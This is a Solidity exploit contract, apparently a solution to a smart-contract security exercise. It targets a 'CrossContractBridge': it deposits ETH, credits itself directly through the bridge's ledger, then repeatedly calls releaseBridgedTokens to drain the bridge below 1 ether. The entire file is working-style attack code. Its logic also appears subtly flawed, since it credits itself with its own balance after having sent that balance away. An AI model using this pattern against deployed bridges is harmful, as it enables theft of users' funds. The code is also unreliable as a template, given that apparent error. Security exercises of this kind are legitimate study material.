// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {CrossContractBridge} from "../src/CrossContractBridge.sol";

contract ExploitModule {
    CrossContractBridge public targetContract;

    constructor(address _target) payable {
        targetContract = CrossContractBridge(payable(_target));
    }

    function runExploit() external payable {
        // First, we deposit some ETH into the bridge contract
        payable(address(targetContract)).call{value: address(this).balance}("");

        // Then we add some credit to ourselves in the ledger
        targetContract.ledger().addCredit(address(this), address(this).balance);

        // Now we can release the tokens multiple times without reducing our credit
        // This drains the bridge contract until it has less than 1 ether left
        while (address(targetContract).balance >= 1 ether) {
            targetContract.releaseBridgedTokens(address(this), 1 ether);
        }
    }

    receive() external payable {}
}
